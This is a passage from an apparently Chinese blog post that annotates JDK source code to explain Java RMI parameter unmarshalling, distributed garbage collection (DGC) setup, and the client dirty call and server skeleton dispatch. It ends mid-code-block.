<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用给定的 MarshalInputStream 反序列化给定实例的给定方法的参数。</span></span><br><span class="line"><span class="comment"> * 在反序列化过程中执行所有额外的检查。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object[] unmarshalParametersChecked(</span><br><span class="line">    DeserializationChecker checker,</span><br><span class="line">    Method method, MarshalInputStream in)</span><br><span class="line"><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 获取当前方法调用的 ID</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">callID</span> <span class="operator">=</span> methodCallIDCount.getAndIncrement();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建自定义检查器，并设置给输入流</span></span><br><span class="line">    <span class="type">MyChecker</span> <span class="variable">myChecker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyChecker</span>(checker, method, callID);</span><br><span class="line">    in.setStreamChecker(myChecker);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取方法的参数类型</span></span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个数组来存储反序列化后的参数值</span></span><br><span class="line">        Object[] values = <span class="keyword">new</span> <span class="title class_">Object</span>[types.length];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 依次反序列化每个参数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">            myChecker.setIndex(i);  <span class="comment">// 设置当前参数的索引</span></span><br><span class="line">            values[i] = unmarshalValue(types[i], in);  <span class="comment">// 反序列化当前参数值</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 完成反序列化并结束检查</span></span><br><span class="line">        myChecker.end(callID);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回反序列化后的参数数组</span></span><br><span class="line">        <span class="keyword">return</span> values;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 清除输入流中的检查器</span></span><br><span class="line">        in.setStreamChecker(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">MarshalInputStream</span> <span class="variable">marshalStream</span> <span class="operator">=</span> (MarshalInputStream) in;</span><br><span class="line">marshalStream.skipDefaultResolveClass();  <span class="comment">// 跳过默认的类解析方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化方法的参数</span></span><br><span class="line">Object[] params = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 反序列化自定义的调用数据</span></span><br><span class="line">    unmarshalCustomCallData(in);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 反序列化参数</span></span><br><span class="line">    params = unmarshalParameters(obj, method, marshalStream);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (AccessException aex) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 释放输入流</span></span><br><span class="line">    call.releaseInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后反射调用远程对象的方法，然后将结果通过 <code>marshalValue</code> 序列化后写入输出流。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用远程对象的方法</span></span><br><span class="line">Object result;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = method.invoke(obj, params);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> e.getTargetException();  <span class="comment">// 如果目标方法抛出异常，则抛出该异常</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化返回值</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取结果流</span></span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">    Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">    <span class="keyword">if</span> (rtype != <span class="keyword">void</span>.class) &#123;</span><br><span class="line">        <span class="comment">// 如果返回类型不是 void，序列化返回值</span></span><br><span class="line">        marshalValue(rtype, result, out);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p><strong>DGC</strong>（Distributed Garbage Collection，分布式垃圾回收）是 RMI 提供的分布式垃圾回收机制，旨在管理远程对象的生命周期，确保远程对象在不再需要时能被自动回收。其主要作用是确保远程对象的生命周期得到正确管理，避免由于客户端和服务器之间的引用关系错误或遗留引用而导致的内存泄漏。</p>
<h4 id="DGC-初始化"><a href="#DGC-初始化" class="headerlink" title="DGC 初始化"></a>DGC 初始化</h4><p>服务端通过 <code>ObjectTable#putTarget</code> 将注册的远程对象放入 <code>objTable</code> 中，里面有默认的 <code>DGCImpl</code> 对象，这个类就是是 RMI 的分布式垃圾回收类。这里分析一下 <code>DGCImpl</code> 对象是什么时候被放到 <code>objTable</code> 中的。</p>
<p>当服务端创建 <code>Target</code> 对象时，<code>permanent</code> 默认为 <code>true</code>，因此会调用 <code>pinImpl</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为远程对象 &quot;impl&quot; 构造一个具有特定对象 ID 的 Target 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果 &quot;permanent&quot; 为 true，则远程对象 impl 将永久固定</span></span><br><span class="line"><span class="comment"> * （该对象将不会被分布式和/或本地垃圾回收）。如果 &quot;on&quot; 为 false，</span></span><br><span class="line"><span class="comment"> * 则该对象可以被回收。永久对象不会阻止服务器退出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote impl, Dispatcher disp, Remote stub, ObjID id,</span></span><br><span class="line"><span class="params">              <span class="type">boolean</span> permanent)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 使用 WeakRef 保存远程对象，实现软引用，便于垃圾回收</span></span><br><span class="line">    <span class="built_in">this</span>.weakImpl = <span class="keyword">new</span> <span class="title class_">WeakRef</span>(impl, ObjectTable.reapQueue);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置对象是否永久固定</span></span><br><span class="line">    <span class="built_in">this</span>.permanent = permanent;</span><br><span class="line">    <span class="keyword">if</span> (permanent) &#123;</span><br><span class="line">        <span class="comment">// 如果对象是永久的，固定该实现对象</span></span><br><span class="line">        pinImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>pinImpl</code> 会进一步调用到 <code>WeakRef#pin</code> 进而调用到 <code>DGCImpl</code> 的静态方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 固定内部引用（将其变成强引用）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">pin</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 如果当前没有强引用</span></span><br><span class="line">    <span class="keyword">if</span> (strongRef == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取弱引用指向的对象并赋值给强引用</span></span><br><span class="line">        strongRef = get();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 DGC 的日志级别是 VERBOSE，记录强引用的值</span></span><br><span class="line">        <span class="keyword">if</span> (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            DGCImpl.dgcLog.log(Log.VERBOSE,</span><br><span class="line">                               <span class="string">&quot;strongRef = &quot;</span> + strongRef);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在目标对象中“固定”impl。</span></span><br><span class="line"><span class="comment"> * 将 WeakRef 对象转换为强引用，确保该远程对象不会被本地垃圾回收。</span></span><br><span class="line"><span class="comment"> * 这样整个弱引用机制就由这个 WeakRef 单独负责。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">pinImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    weakImpl.pin();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们知道，当一个类的静态方法或者静态成员被访问的时候，会触发隐式类加载，类的静态代码块被执行并且类的静态变量被初始化。</p>
<p>首先租约时长 <code>leaseValue</code> 会被初始化为默认值 10 分钟。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** lease duration to grant to clients */</span></span><br><span class="line"><span class="comment">// 授予客户端的租约时长（租期）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">leaseValue</span> <span class="operator">=</span>              <span class="comment">// 默认值为 10 分钟（600000 毫秒）</span></span><br><span class="line">    AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">GetLongAction</span>(<span class="string">&quot;java.rmi.dgc.leaseValue&quot;</span>, <span class="number">600000</span>));</span><br></pre></td></tr></table></figure></div>

<p>另外还会执行 <code>DGCImpl</code> 的静态代码代码块：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &quot;Export&quot; the singleton DGCImpl in a context isolated from</span></span><br><span class="line"><span class="comment">     * the arbitrary current thread context.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// 保存当前线程的上下文类加载器</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 将当前线程的上下文类加载器设置为系统类加载器</span></span><br><span class="line">                Thread.currentThread().setContextClassLoader(</span><br><span class="line">                    ClassLoader.getSystemClassLoader());</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 手动将远程回收对象放入表中，以防止监听端口。</span></span><br><span class="line"><span class="comment">                 * (UnicastServerRef.exportObject 会导致 transport 开始监听)</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();  <span class="comment">// 创建 DGCImpl 的实例</span></span><br><span class="line">                    <span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);  <span class="comment">// 创建 DGC 的 ObjID</span></span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);  <span class="comment">// 创建 LiveRef 引用</span></span><br><span class="line">                    <span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref, DGCImpl::checkInput);  <span class="comment">// 创建 UnicastServerRef</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 创建 DGCImpl 的远程代理 (Stub)</span></span><br><span class="line">                    <span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span> Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    disp.setSkeleton(dgc);  <span class="comment">// 设置 Skeleton</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 创建必要的权限</span></span><br><span class="line">                    <span class="type">Permissions</span> <span class="variable">perms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                    perms.add(<span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;accept,resolve&quot;</span>));</span><br><span class="line">                    ProtectionDomain[] pd = &#123; <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="literal">null</span>, perms) &#125;;</span><br><span class="line">                    <span class="type">AccessControlContext</span> <span class="variable">acceptAcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccessControlContext</span>(pd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 使用 PrivilegedAction 创建 Target 对象</span></span><br><span class="line">                    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, acceptAcc);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 将 target 放入 ObjectTable 中</span></span><br><span class="line">                    ObjectTable.putTarget(target);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(</span><br><span class="line">                        <span class="string">&quot;exception initializing server-side DGC&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 恢复原线程的上下文类加载器</span></span><br><span class="line">                Thread.currentThread().setContextClassLoader(savedCcl);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分的主要逻辑为：</p>
<ol>
<li><p><code>DGCImpl</code> 的设计是单例模式，因此首先会在静态代码快中创建唯一的 <code>DGCImpl</code> 实例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();  <span class="comment">// 创建 DGCImpl 的实例</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建用于远程通信的 <code>LiveRef</code>，并封装为 <code>UnicastServerRef</code>。其中 <code>ObjId</code> 为 2，监听端口随机。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);  <span class="comment">// 创建 DGC 的 ObjID</span></span><br><span class="line"><span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);  <span class="comment">// 创建 LiveRef 引用</span></span><br><span class="line"><span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref, DGCImpl::checkInput);  <span class="comment">// 创建 UnicastServerRef</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>和注册中心一样，<code>UnicastServerRef#setSkeleton</code> 会调用 <code>Util.createSkeleton</code> 创建注册中心 <code>DGCImpl_Skel</code> 的骨架类</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disp.setSkeleton(dgc);  <span class="comment">// 设置 Skeleton</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建 <code>DGCImpl</code> 的存根对象  <code>DGCImpl_Stub</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 DGCImpl 的远程代理 (Stub)</span></span><br><span class="line"><span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span> Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建 <code>Target</code> 对象并存放至 <code>ObjectTable</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 PrivilegedAction 创建 Target 对象</span></span><br><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, acceptAcc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 target 放入 ObjectTable 中</span></span><br><span class="line">ObjectTable.putTarget(target);</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h4 id="客户端部分-1"><a href="#客户端部分-1" class="headerlink" title="客户端部分"></a>客户端部分</h4><p>当注册中心返回一个 <code>Stub</code> 给客户端时，其跟踪 <code>Stub</code> 在客户端中的使用。当再没有更多的对 <code>Stub</code> 的引用时，或者如果引用的“租借”过期（租期默认 10 分钟）并且没有更新，服务端将垃圾回收远程对象。客户端可以调用 <code>dirty</code> 用来续租，也可以调用 <code>clean</code> 用来清除远程对象。</p>
<p>类似注册中心，客户端本地也会生成一个 <code>DGCImpl_Stub</code>，并调用 <code>DGCImpl_Stub#dirty</code>，用来向服务端”租赁”远程对象的引用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// implementation of dirty(ObjID[], long, Lease)</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.dgc.Lease <span class="title function_">dirty</span><span class="params">(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, <span class="type">long</span> $param_long_2, java.rmi.dgc.Lease $param_Lease_3)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 StreamRemoteCall 对象，用于发送远程调用请求</span></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span></span><br><span class="line">                (StreamRemoteCall) ref.newCall((java.rmi.server.RemoteObject) <span class="built_in">this</span>,</span><br><span class="line">                        operations, <span class="number">1</span>, interfaceHash);</span><br><span class="line">        call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);  <span class="comment">// 设置输入过滤器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();  <span class="comment">// 获取输出流</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将参数写入输出流</span></span><br><span class="line">            out.writeObject($param_arrayOf_ObjID_1);  <span class="comment">// 写入远程对象的 ObjID 数组</span></span><br><span class="line">            out.writeLong($param_long_2);  <span class="comment">// 写入租期（long 类型）</span></span><br><span class="line">            out.writeObject($param_Lease_3);  <span class="comment">// 写入当前租赁对象（Lease）</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);  <span class="comment">// 处理序列化异常</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ref.invoke(call);  <span class="comment">// 调用远程方法</span></span><br><span class="line"></span><br><span class="line">        java.rmi.dgc.Lease $result;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> call.getConnection();  <span class="comment">// 获取连接对象</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();  <span class="comment">// 获取输入流</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从输入流中读取并反序列化返回的 Lease 对象</span></span><br><span class="line">            $result = (java.rmi.dgc.Lease) in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>前面在服务调用分析过：</p>
<ul>
<li><code>ref.invoke(call)</code> 会有调用链 <code>invoke =&gt; UnicastRef#invoke =&gt; executeCall() =&gt; readObject()</code>，其中 <code>executeCall</code> 会在远程调用异常的时候将异常对象反序列化。</li>
<li>如果正常调用，<code>dirty</code> 后续会对返回的对象反序列化。</li>
</ul>
<h4 id="服务端部分-1"><a href="#服务端部分-1" class="headerlink" title="服务端部分"></a>服务端部分</h4><p>因为也是远程调用，因此服务端同样会通过 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code> 函数处理请求。然后又因为 <code>DGCImpl</code> 对应的 <code>Target</code> 与注册中心类似，因此有调用链 <code>handleMessages =&gt; UnicastServerRef#dispatch =&gt; oldDispatch</code>。</p>
<p><code>oldDispatch</code> 会调用 <code>DGCImpl_Skel#dispatch</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 RMI 1.1 存根/骨架协议处理服务器端的调度，</span></span><br><span class="line"><span class="comment"> * 给定一个非负的操作编号或已经从调用流中读取的负方法哈希值。</span></span><br><span class="line"><span class="comment"> * 异常由调用者处理，并发送到远程客户端。</span></span><br><span 